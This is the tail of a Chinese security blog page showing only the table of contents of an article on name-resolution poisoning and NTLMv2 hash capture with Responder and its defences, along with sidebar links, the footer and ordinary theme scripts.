攻击原理：名称解析协议的弱点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE%E9%99%8D%E7%BA%A7"><span class="toc-number">12.1.1.1.</span> <span class="toc-text">(1) 名称解析协议降级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E9%93%BE%E8%B7%AF%E5%A4%9A%E6%92%AD%EF%BC%88Link-Local-Multicast%EF%BC%89"><span class="toc-number">12.1.1.2.</span> <span class="toc-text">(2) 本地链路多播（Link-Local Multicast）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">12.1.2.</span> <span class="toc-text">2. 攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%AF%B1%E9%AA%97%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E8%B5%B7%E8%AE%A4%E8%AF%81"><span class="toc-number">12.1.2.1.</span> <span class="toc-text">步骤1：诱骗客户端发起认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E8%A7%A6%E5%8F%91NTLM%E8%AE%A4%E8%AF%81"><span class="toc-number">12.1.2.2.</span> <span class="toc-text">步骤2：触发NTLM认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E6%8D%95%E8%8E%B7NTLM%E5%93%88%E5%B8%8C"><span class="toc-number">12.1.2.3.</span> <span class="toc-text">步骤3：捕获NTLM哈希</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">12.1.3.</span> <span class="toc-text">3. 常用工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B%EF%BC%88Responder-%E6%8D%95%E8%8E%B7NTLMv2%E5%93%88%E5%B8%8C%EF%BC%89"><span class="toc-number">12.1.4.</span> <span class="toc-text">4. 攻击示例（Responder 捕获NTLMv2哈希）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">12.1.5.</span> <span class="toc-text">5. 防御方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%A6%81%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-number">12.1.5.1.</span> <span class="toc-text">(1) 禁用不安全的协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8DNS%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95"><span class="toc-number">12.1.5.2.</span> <span class="toc-text">(2) 强制使用DNS安全扩展</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%98%BB%E6%AD%A2NTLM%E5%8D%8F%E8%AE%AE%E6%BB%A5%E7%94%A8"><span class="toc-number">12.1.5.3.</span> <span class="toc-text">(3) 阻止NTLM协议滥用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E4%B8%8E%E9%9A%94%E7%A6%BB"><span class="toc-number">12.1.5.4.</span> <span class="toc-text">(4) 网络监控与隔离</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%94%A8%E6%88%B7%E6%95%99%E8%82%B2%E4%B8%8E%E7%AD%96%E7%95%A5"><span class="toc-number">12.1.5.5.</span> <span class="toc-text">(5) 用户教育与策略</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%89%A9%E5%B1%95%EF%BC%9A%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB%EF%BC%88Relay%EF%BC%89%E9%98%B2%E5%BE%A1"><span class="toc-number">12.1.6.</span> <span class="toc-text">6. 扩展：中继攻击（Relay）防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">12.1.7.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/16167/" title="提示词注入攻击(Prompt Injecting)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/AI%20Infra%20feature%20image-1.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="提示词注入攻击(Prompt Injecting)"/></a><div class="content"><a class="title" href="/posts/16167/" title="提示词注入攻击(Prompt Injecting)">提示词注入攻击(Prompt Injecting)</a><time datetime="2025-06-22T16:00:00.000Z" title="发表于 2025-06-23 00:00:00">2025-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/44081/" title="安卓逆向技术"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/5c4406f679dc69b549b48fa6_p17s2tfgc31jte13d51pea1l2oblr3.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安卓逆向技术"/></a><div class="content"><a class="title" href="/posts/44081/" title="安卓逆向技术">安卓逆向技术</a><time datetime="2025-06-22T16:00:00.000Z" title="发表于 2025-06-23 00:00:00">2025-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18965/" title="Android-JAVA开发基础"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/5c4406f679dc69b549b48fa6_p17s2tfgc31jte13d51pea1l2oblr3.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android-JAVA开发基础"/></a><div class="content"><a class="title" href="/posts/18965/" title="Android-JAVA开发基础">Android-JAVA开发基础</a><time datetime="2025-06-15T16:00:00.000Z" title="发表于 2025-06-16 00:00:00">2025-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/60615/" title="JAVA内存马"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/java_logo_icon_168609.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA内存马"/></a><div class="content"><a class="title" href="/posts/60615/" title="JAVA内存马">JAVA内存马</a><time datetime="2025-06-09T16:00:00.000Z" title="发表于 2025-06-10 00:00:00">2025-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/32372/" title="内网穿透技术"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网穿透技术"/></a><div class="content"><a class="title" href="/posts/32372/" title="内网穿透技术">内网穿透技术</a><time datetime="2025-05-23T16:00:00.000Z" title="发表于 2025-05-24 00:00:00">2025-05-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064234.png" alt="网络安全行业初级从业者！~" title="网络安全行业初级从业者！~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2025 By <a class="footer-bar-link" href="/" title="Takake" target="_blank">Takake</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com" title="GITHUB">GITHUB</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://chat.opengpt.lol" title="CHATGPT">CHATGPT</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">91</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">166</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">12</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.takake.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https:/api.opengpt.lol/" title="GPT-API"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="GPT-API"/><span class="back-menu-item-text">GPT-API</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI%E8%AF%AD%E8%A8%80%E5%A4%A7%E6%A8%A1%E5%9E%8B/" style="font-size: 0.88rem;">AI语言大模型<sup>1</sup></a><a href="/tags/APK/" style="font-size: 0.88rem;">APK<sup>2</sup></a><a href="/tags/Android/" style="font-size: 0.88rem;">Android<sup>1</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 0.88rem;">Chrome<sup>2</sup></a><a href="/tags/Docker/" style="font-size: 0.88rem;">Docker<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 0.88rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>6</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 0.88rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>19</sup></a><a href="/tags/TLS/" style="font-size: 0.88rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 0.88rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 0.88rem;">draft<sup>5</sup></a><a href="/tags/esxi/" style="font-size: 0.88rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 0.88rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 0.88rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 0.88rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">云安全<sup>2</sup></a><a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" style="font-size: 0.88rem;">人工智能<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>16</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 0.88rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 0.88rem;">密码<sup>8</sup></a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 0.88rem;">权限提升<sup>2</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 0.88rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 0.88rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 0.88rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 0.88rem;">证书<sup>1</sup></a><a href="/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">软件开发<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8923547078" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8923547078&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/js/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("12/01/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎来到My Blog!`,
    `生活明朗, 万物可爱`,
    `
    ████████╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗███████╗
    ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║ ██╔╝██╔════╝
       ██║   ███████║█████╔╝ ███████║█████╔╝ █████╗  
       ██║   ██╔══██║██╔═██╗ ██╔══██║██╔═██╗ ██╔══╝  
       ██║   ██║  ██║██║  ██╗██║  ██║██║  ██╗███████╗
       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        `,
    "已上线",
    dnum,
    "天",
    "©2022 By Takake V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【骇客】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
        img.title = "下班玩人工智能，嘿嘿~";
        img.alt = "下班玩人工智能，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
